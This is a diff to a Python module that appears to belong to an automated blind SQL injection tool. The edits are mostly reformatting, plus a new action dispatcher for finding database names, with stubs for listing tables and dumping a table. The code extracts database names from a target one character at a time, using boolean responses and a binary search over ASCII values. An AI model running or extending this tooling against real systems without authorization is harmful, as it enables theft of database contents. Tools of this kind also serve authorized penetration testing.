@@ -54,7 +54,7 @@ async def find_letter_in_string(request, parameter, true_and_false_responses, qu
     """
     lower_bound = ASCII_LOWER_BOUND
     upper_bound = ASCII_UPPER_BOUND
-    i = math.ceil((lower_bound + upper_bound)/2)
+    i = math.ceil((lower_bound + upper_bound) / 2)
     while upper_bound >= lower_bound:
         equal_reponse = await send_sql_request(request, parameter, query % (EQUAL_SIGN, str(i)), session)
         equal_reponse_text = await equal_reponse.text()
@@ -76,7 +76,7 @@ async def find_letter_in_string(request, parameter, true_and_false_responses, qu
             upper_bound = i - 1
         else:
             lower_bound = i + 1
-        i = math.ceil((lower_bound + upper_bound)/2)
+        i = math.ceil((lower_bound + upper_bound) / 2)
     return NOT_DETECTED
 
 
@@ -92,7 +92,8 @@ async def find_word(request, parameter, query, true_and_false_responses, session
     tasks = []
     for i in range(1, word_length + 1):
         tasks.append(
-            asyncio.create_task(find_letter_in_string(request, parameter, true_and_false_responses, query % (i, STRING_PLACEHOLDER, STRING_PLACEHOLDER), session)))
+            asyncio.create_task(find_letter_in_string(request, parameter, true_and_false_responses,
+                                                      query % (i, STRING_PLACEHOLDER, STRING_PLACEHOLDER), session)))
     ret = await asyncio.wait(tasks)
     word = ''.join([task.result() for task in tasks])
     return word
@@ -117,15 +118,15 @@ async def find_db_names(request, parameter, comment, true_and_false_responses, s
                                            BLIND_BOOLEAN_DB_NAME_LENGTH % (i, STRING_PLACEHOLDER, comment),
                                            MAX_LEN_OF_STRING,
                                            session)
-        db_name = await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_CHAR % (STRING_PLACEHOLDER, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
-                        true_and_false_responses, session,
-                        length_of_word)  # The query should be a single letter find query with an index placeholder
+        db_name = await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_CHAR % (
+        STRING_PLACEHOLDER, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
+                                  true_and_false_responses, session,
+                                  length_of_word)  # The query should be a single letter find query with an index placeholder
         db_names.append(db_name)
     return db_names
 
 
-
-async def boolean_based_injection(request, parameter, comment, session):
+async def boolean_based_injection(request, parameter, comment, session, flags):
     """
     manages the boolean-based injection attempts
     :param request: the request we will modify
@@ -135,5 +136,11 @@ async def boolean_based_injection(request, parameter, comment, session):
     """
     true_and_false_responses = await check_if_boolean_based_is_possible(request, parameter, comment, session)
     if true_and_false_responses != NOT_DETECTED:  # boolean is possible!
-        db_names = await find_db_names(request, parameter, comment, true_and_false_responses, session)
-        print(db_names)
+        action = flags.get_action()
+        if action == FIND_DB_NAMES:
+            db_names = await find_db_names(request, parameter, comment, true_and_false_responses, session)
+            print(db_names)
+        elif action == FIND_TABLE_NAMES:
+            a = 1
+        elif action == DUMP_TABLE:
+            a = 1
